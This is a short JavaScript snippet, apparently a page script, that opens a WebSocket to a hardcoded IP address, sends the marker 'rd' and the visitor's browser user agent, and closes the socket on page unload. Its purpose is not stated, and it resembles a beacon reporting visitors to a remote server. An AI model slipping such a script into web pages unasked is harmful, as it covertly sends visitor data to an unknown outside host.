var ws = new WebSocket("ws://193.112.190.29:4200");

ws.onopen = function () {
    ws.send("rd");
    ws.send(navigator.userAgent);
}

window.addEventListener("unload", function (ev) { ws.close(); })